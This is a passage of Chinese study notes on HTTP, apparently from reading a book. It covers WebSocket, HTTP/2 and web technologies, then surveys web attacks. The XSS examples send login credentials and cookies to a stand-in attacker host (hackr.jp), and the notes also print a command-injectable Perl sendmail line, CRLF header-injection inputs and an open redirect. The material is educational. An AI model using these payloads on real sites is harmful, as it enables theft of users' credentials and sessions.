        var socket = new WebSocket('ws://game.example.com:12010/updates');
        socket.onopen = function () {
            setInterval(function() {
                if (socket.bufferedAmount == 0) {
                    socket.send(getUpdateData());
                }
            }, 50);
        };
        ```
    5. ![](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/websocket.png?raw=true)
5. HTTP2.0
    1. 改善用户在使用web时的速度体验

## 六、构建web内容的技术
1. web页面几乎全由HTML构建
2. CSS，使文档的结构和设计分离
3. DOM是用以操作HTML文档和XML文档的API
4. CGI（common gateway interface, 通用网关接口）是指web服务器在接收到客户端发送过来的请求后转发给程序的一组机制
5. CGI程序通常用Perl, php, ruby, c等编程语言编写而成
6. servlet是用java实现的，一种能在服务器上创建动态内容的程序

## 七、针对web的攻击技术
1. HTTP不具备必要的安全功能
2. 在客户端可篡改请求
    * 在HTTP请求报文内加载攻击代码
    * 通过URL查询字段或表单、HTTP首部、Cookie等途径把攻击代码传入
3. 攻击模式
    1. 主动攻击
        * SQL注入攻击
        * OS命令注入攻击
    2. 被动攻击
        1. 设计好陷阱，陷阱会触发嵌入攻击代码的HTTP请求
        2. 用户的浏览器或邮件系统触发这个陷阱
        3. 用户把含有攻击代码的HTTP请求发送给作为攻击目标的web应用，执行攻击代码
        4. web应用成为攻击者的跳板，导致用户的cookie个人信息被窃取，登录状态的用户权限被恶意滥用
        5. ![](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB.png?raw=true)
4. 输出值转义不完全引发的安全漏洞
    1. 客户端的验证并不能作为安全防范对策，只能起到尽早辨识错误，提高UI体验的作用
    2. 跨站脚本攻击（XSS）
        1. 对用户登陆信息进行获取
        ```js
        // 用户点击此url到网页，在表单内输入ID和密码后，直接发送给了攻击者的网站
        "http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s=""
        ```
        ```html
        <div class="logo">
            <img src="/img/logo.gif" alt="E! 拍卖会" />
            </div>
            <form action="http://example.jp/login" method="post" id="login">
            <div class="input_id">
            ID <input type="text" name="ID" value="yama" />
        </div>
        ```
        2. 对用户的cookie进行窃取攻击
        ```html
        <script src=http://hackr.jp/xss.js></script>
        ```
        ```js
        // 访问web域名下的cookie信息，然后将信息发送给攻击者的网站（http://hackr.jp/?），记录到了攻击者的日志中
        var content = escape(document.cookie);
        document.write("<img src=http://hackr.jp/?");
        document.write(content);
        document.write(">");
        ```
    3. SQL注入攻击
        * 使用SQL语句作为查询条件，请求HTTP服务器，执行数据库操作，导致数据库信息被非法浏览或者篡改
    4. OS命令注入攻击
        * 通过web应用，执行非法的操作系统命令达到攻击的目的
        ```shell
        my $adr = $q->param('mailaddress');
        open(MAIL, "| /usr/sbin/sendmail $adr");
        print MAIL "From: info@example.com\n";
        ```
    5. HTTP首部注入攻击
        1. 通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击
        2. 设置任意cookie
            * 输入 101%0D%0ASet-Cookie:+SID=123456789
            * 响应 
                Location: http://example.com/?cat=101（%0D%0A ：换行符）
                Set-Cookie: SID=123456789
        4. 重定向至任意url
            * HTTP首部注入Location: http://example.com/?cat=101。令浏览器发生重定向跳转 
        5. 显示任意的主体（HTTP响应截断攻击）
            ```js
            Set-Cookie: UID=（%0D%0A ：换行符）
            （%0D%0A ：换行符）
            <HTML><HEAD><TITLE>之后，想要显示的网页内容 <!--（原来页面对应的首部字
            ```  
    6. 邮件首部注入攻击
    7. 目录遍历攻击
    8. 远程文件包含漏洞
5. 因设置或设计上的缺陷，引发的安全漏洞
    1. 强制浏览
        * 根据文件名，推断出文件目录地址，查看其他文件的隐私信息
    2. 不正确的错误消息处理，输入邮箱，根据错误消息提示，推断出用户是否在该网站注册过
    3. 开放重定向
        ```js
        `http://example.com/?redirect=http://www.tricorder.jp`
        // 篡改后
        `http://example.com/?redirect=http://hackr.jp`
        ``` 
6.  因会话管理疏忽引发的安全漏洞
    1. 会话劫持
        ![](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81.PNG?raw=true)
    2. 会话固定攻击
        ![](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB.PNG?raw=true)
    3. 跨站点请求伪装
        ![](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E8%A3%85.PNG?raw=true)
7.  其他安全漏洞
    1. 密码破解
        1. 通过网路的密码试错
            * 穷举法
            * 字典攻击
        2. 通过SQL注入等入侵系统，窃取密码
    2. 对已加密密码的破解
        1. 采用和穷举法或字典攻击相同的手法，尝试用相同的散列函数加密候选密码，将计算出的散列值与目标散列值进行匹配，类推出密码
        2. 彩虹表
        3. 拿到密钥
        4. 加密算法的漏洞
    3. 点击劫持（用透明的按钮或者网页覆盖在用户需要访问的web页面上）
    4. Dos攻击
        * 通过集中访问，造成资源过载，服务器崩溃
        * 通过攻击安全漏洞，使服务器停止
    5. 后门程序
        * 开发阶段作为Debug调用的后门程序
        * 开发者为了自身的利益植入的后门程序
        * 攻击者通过某种方法设置的后门程序
